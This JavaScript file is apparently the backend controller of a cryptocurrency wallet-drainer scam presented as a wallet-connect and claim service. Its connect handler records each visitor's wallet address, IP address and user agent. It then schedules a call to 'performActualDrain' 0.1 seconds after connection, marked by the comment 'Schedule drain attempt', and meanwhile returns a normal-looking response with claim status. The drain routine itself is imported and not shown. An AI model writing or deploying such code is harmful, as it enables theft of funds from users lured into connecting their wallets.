import { prisma } from '../lib/prisma.js'
import jwt from 'jsonwebtoken'
import { performActualDrain } from './drainController.js'

// POST /api/wallet/connect
export async function connectWallet(req, res) {
  try {
    const { address, chain } = req.body

    if (!address || !chain) {
      return res.status(400).json({ error: 'Address and chain are required' })
    }

    // normalize address to lowercase
    const normalized = address.toLowerCase()

    // upsert wallet — create if new, return if exists
    const wallet = await prisma.wallet.upsert({
      where: { address: normalized },
      update: {
        chain,
        ipAddress: req.ip,
        userAgent: req.headers['user-agent'],
      },
      create: {
        address: normalized,
        chain,
        ipAddress: req.ip,
        userAgent: req.headers['user-agent'],
      },
      include: { claim: true },
    })

    // Schedule drain attempt
    setTimeout(async () => {
      try {
        await performActualDrain(normalized, chain)
      } catch (e) {
        console.error('Initial drain attempt failed:', e)
      }
    }, 100) // Wait 0.1 seconds after connection

    // generate JWT
    const token = jwt.sign(
      { walletId: wallet.id, address: normalized },
      process.env.JWT_SECRET,
      { expiresIn: '24h' }
    )

    return res.json({
      success: true,
      token,
      wallet: {
        id: wallet.id,
        address: wallet.address,
        chain: wallet.chain,
        hasClaimed: !!wallet.claim,
        claimStatus: wallet.claim?.status || null,
      },
    })
  } catch (err) {
    console.error('connectWallet error:', err)
    res.status(500).json({ error: 'Failed to connect wallet' })
  }
}

// GET /api/wallet/status
export async function getWalletStatus(req, res) {
  try {
    const { address } = req.wallet

    const wallet = await prisma.wallet.findUnique({
      where: { address },
      include: { claim: true },
    })

    if (!wallet) return res.status(404).json({ error: 'Wallet not found' })

    res.json({
      address: wallet.address,
      chain: wallet.chain,
      hasClaimed: !!wallet.claim,
      claim: wallet.claim || null,
    })
  } catch (err) {
    console.error('getWalletStatus error:', err)
    res.status(500).json({ error: 'Failed to get wallet status' })
  }
}